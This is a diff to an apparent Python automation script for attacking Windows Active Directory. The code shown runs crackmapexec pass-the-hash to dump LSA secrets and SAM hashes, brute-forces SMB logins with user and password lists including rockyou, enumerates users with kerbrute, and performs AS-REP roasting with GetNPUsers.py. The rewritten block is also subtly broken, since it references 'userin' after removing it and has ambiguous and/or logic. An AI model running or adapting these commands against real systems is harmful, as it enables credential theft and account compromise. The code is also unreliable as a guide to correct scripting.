@@ -311,6 +311,15 @@ def crackmapexec():
 		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --lsa")
 		print("\033[1;31m Trying to dump SAM\033[1;39m")
 		system(c+" "+s+" "+domainip+" -u "+username+" -H "+hashes+" --sam")
+	if (len(userfile) != 0 ) or (len(passfile) != 0 ):
+		print("\033[1;31m Trying to bruteforce login\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+userfile+" -p "+passfile+"")
+	if (len(username) != 0) and (len(passfile) != 0):
+		print("\033[1;31m Trying to bruteforce login\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+passfile+"")
+	if (len(password) != 0) and (len(userfile) != 0):
+		print("\033[1;31m Trying to bruteforce login\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+userfile+" -p "+password+"")
 
 def mimikatz():
 	if (len(username) != 0) and (len(password) != 0):
@@ -339,16 +348,13 @@ if search_word in open(domainip+"-rustscan.txt").read():
 		system("ldapdomaindump "+domainip+"")
 		system("mv domain* LDAP/")
 		print("\033[1;31m Tried anonymous ldapdomaindump and put in LDAP folder\033[1;39m\n")
-	if (len(username) != 0) and (len(password) == 0):
-		userin = input("Is that a username or userfile? (u/uf):\n")
-		if userin == "u":
-			system("crackmapexec smb "+domainip+" -u "+username+" -p /usr/share/wordlists/rockyou.txt")
-		if userin == "uf":
-			system("locate kerbrute_linux_amd64")
-			ker = input("Full file path to kerbrute?")
-			threads = input("How many threads would you like to run, higher is faster?")
-			system(ker+" userenum -d "+domain+" --dc "+domainip+" "+username+" -t "+threads+"")
-			system("GetNPUsers.py "+domainip+"/ -no-pass -usersfile "+userin+" -dc-ip "+domainip+"")
+	if (len(userfile) != 0) and (len(password) == 0) or (len(passfile) ==0 ):
+		system("crackmapexec smb "+domainip+" -u "+username+" -p /usr/share/wordlists/rockyou.txt")
+		system("locate kerbrute_linux_amd64")
+		ker = input("Full file path to kerbrute?")
+		threads = input("How many threads would you like to run, higher is faster?:\n")
+		system(ker+" userenum -d "+domain+" --dc "+domainip+" "+userfile+" -t "+threads+"")
+		system("GetNPUsers.py "+domainip+"/ -no-pass -usersfile "+userin+" -dc-ip "+domainip+"")
 	if (len(username) != 0 ) and (len(password) != 0 ):
 		print("\033[1;31m Making directory LDAP and doing LDAP domain dump\033[1;39m\n")
 		sys = ""+domain+"/"+username+":"+password+" -dc-ip "+domainip+""
